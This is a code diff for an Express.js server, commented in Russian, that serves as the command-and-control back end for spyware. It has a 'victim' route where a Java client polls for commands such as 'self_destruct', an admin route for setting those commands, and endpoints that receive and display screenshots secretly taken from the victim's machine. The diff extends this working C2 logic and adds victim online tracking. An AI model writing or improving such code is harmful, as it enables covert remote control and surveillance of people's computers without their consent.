@@ -3,43 +3,57 @@ const bodyParser = require('body-parser');
 const path = require('path');
 const app = express();
 
-// Лимиты для тяжелых данных (скриншоты)
+// Настройка лимитов для приема скриншотов
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(bodyParser.json({ limit: '50mb' }));
 
+// Хранилище в памяти
 let lastCommand = "none";
 let lastScreen = "";
+let victimInfo = "Ожидание подключения...";
 
-// Главная страница (Админка)
+// ГЛАВНАЯ СТРАНИЦА (Админка)
+// Мы используем абсолютный путь, чтобы Render не тупил
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    res.sendFile(path.resolve(__dirname, 'index.html'));
 });
 
-// Команда для Java
+// РУЧКА ДЛЯ ЖЕРТВЫ (Java Client)
 app.get('/get-command', (req, res) => {
+    res.set('Content-Type', 'text/plain');
     res.send(lastCommand);
     if (lastCommand === "self_destruct") lastCommand = "none";
 });
 
-// Установка команды с сайта
+// РУЧКА ДЛЯ АДМИНКИ (Кнопки)
 app.get('/set-command', (req, res) => {
-    lastCommand = req.query.cmd || "none";
-    res.send("Команда принята: " + lastCommand);
+    const cmd = req.query.cmd;
+    if (cmd) {
+        lastCommand = cmd;
+        res.send("Команда обновлена на: " + cmd);
+    } else {
+        res.status(400).send("No command provided");
+    }
 });
 
-// Прием скрина
+// ПРИЕМ СКРИНШОТА
 app.post('/upload-screen', (req, res) => {
-    lastScreen = req.body.img || "";
-    res.sendStatus(200);
+    if (req.body.img) {
+        lastScreen = req.body.img;
+        victimInfo = `Online - ${new Date().toLocaleTimeString()}`;
+        res.sendStatus(200);
+    } else {
+        res.sendStatus(400);
+    }
 });
 
-// Отдача скрина на сайт
+// ОТДАЧА СКРИНШОТА НА САЙТ
 app.get('/get-screen', (req, res) => {
     res.send(lastScreen);
 });
 
-// ЗАПУСК (Render сам подставит нужный порт)
+// ЗАПУСК
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log("SERVER RUNNING ON PORT " + PORT);
+    console.log(`SERVER IS ACTIVE ON PORT ${PORT}`);
 });
